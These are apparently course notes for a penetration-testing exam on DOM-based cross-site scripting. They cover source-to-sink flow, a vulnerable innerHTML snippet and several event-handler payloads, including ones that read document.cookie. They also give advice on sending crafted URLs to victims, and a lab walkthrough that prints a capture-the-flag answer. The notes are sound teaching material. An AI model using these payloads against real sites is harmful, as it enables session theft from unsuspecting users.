# Section 4 — DOM-based XSS

---

## What Makes It DOM-Based

Input never reaches the server. Client-side JavaScript reads it from sources like `location.hash`, `location.search`, or `document.URL`, then writes it into the Document Object Model (DOM). The injection happens entirely in the browser.

Telltale sign: the URL uses `#` (fragment) instead of `?` (query string) for the parameter. Fragments never leave the browser.

```
http://TARGET/#task=...    ← DOM XSS — # is client-side only
http://TARGET/?task=...    ← Reflected XSS — ? is sent to server
```

---

## Source → Sink Model

| Concept | Definition | Examples |
|---------|-----------|----------|
| **Source** | Where user input enters JS | `document.URL`, `location.hash`, `location.search`, `document.referrer`, `localStorage`, input fields |
| **Sink** | JS function that writes input back into the DOM | `innerHTML`, `outerHTML`, `document.write()`, `eval()`, jQuery `add()`/`after()`/`append()`/`html()` |

If a source flows into a sink without sanitization → DOM XSS.

```javascript
// Source: URL fragment
var pos = document.URL.indexOf("task=");
var task = document.URL.substring(pos + 5, document.URL.length);

// Sink: innerHTML
document.getElementById("todo").innerHTML = "<b>Next Task:</b> " + decodeURIComponent(task);
```
> This is the vulnerable pattern: user-controlled URL data flows directly into `innerHTML`. Any attacker-supplied HTML or script tags will be rendered by the browser.

---

## Payload Adjustments

`innerHTML` **strips `<script>` tags** as a built-in mitigation. Use event-handler payloads instead:

```html
<img src='' onerror=alert(window.origin)>
<img src=x onerror=alert(document.cookie)>
<svg onload=alert(1)>
<iframe src="javascript:alert(1)">
<body onload=alert(1)>
<details open ontoggle=alert(1)>
```
> Use these when `<script>` is blocked by `innerHTML`. The `<img onerror>` is the most reliable: an empty or broken `src` always fails to load, so the error handler always fires. Swap `alert(1)` for `alert(document.cookie)` to test real impact.

---

## Detection Workflow

1. Submit a test value via the form
2. Network tab: no HTTP request fired? → DOM-based
3. View **rendered** HTML (Inspector / `Ctrl+Shift+C`) — the static page source won't show it
4. Trace input back through JS — find the source (URL fragment, hash) and sink (innerHTML, etc.)
5. Craft a payload that bypasses sink restrictions

---

## Delivery

Delivery works the same as reflected XSS — send the crafted URL to the victim. Since the fragment never hits the server, server-side logs will not show the payload. This is good for stealth but makes incident response harder.

```
http://TARGET/#task=<img src='' onerror=alert(document.cookie)>
```

---

## Lab — DOM XSS

**Target:** `154.57.164.83:30951`

### Q1 — Flag via cookie payload

```html
<img src='' onerror=alert(document.cookie)>
```

Full URL:
```
http://154.57.164.83:30951/#task=<img src='' onerror=alert(document.cookie)>
```

### Extracting the flag without a browser

The lab page contains a base64-obfuscated cookie-setting script in the HTML:

```html
<script>eval(atob("ZG9jdW1lbnQuY29va2llID0gYXRvYignU0ZSQ2UzQjFjak5zZVY5amJERXpiamRmTlRGa00zMD0nKTs="));</script>
```

Decode the outer layer:
```bash
echo "ZG9jdW1lbnQuY29va2llID0gYXRvYignU0ZSQ2UzQjFjak5zZVY5amJERXpiamRmTlRGa00zMD0nKTs=" | base64 -d
# document.cookie = atob('SFRCe3B1cjNseV9jbDEzbjdfNTFkM30=');
```
> Decodes a base64-encoded string and prints the result. Pipe to `base64 -d` again if the output is itself base64.

Decode the inner cookie value:
```bash
echo "SFRCe3B1cjNseV9jbDEzbjdfNTFkM30=" | base64 -d
# HTB{pur3ly_cl13n7_51d3}
```
> Same decode step. This reveals the cookie value that the lab's JavaScript set client-side.

**Flag:** `HTB{pur3ly_cl13n7_51d3}`

> The cookie is set client-side via JS — there's no `Set-Cookie` header on the server response, unlike Sections 2 and 3. That's the whole point: DOM XSS is purely client-side.

---

## Exam Notes

- DOM XSS uses a `#` fragment as the source and a DOM sink to execute. No server is involved.
- `<script>` tags are blocked by `innerHTML`. Use event-handler payloads like `<img onerror>` or `<svg onload>` instead.
- Source/sink terminology appears on the CPTS exam. Memorize the common sinks: `innerHTML`, `document.write`, `eval`, and jQuery's `html()`.
- DOM XSS evades server-side Web Application Firewalls (WAFs) entirely. Input never crosses the wire.
- Hardening: sanitize input before writing to the DOM using DOMPurify, or use `textContent`/`innerText` instead of `innerHTML`.
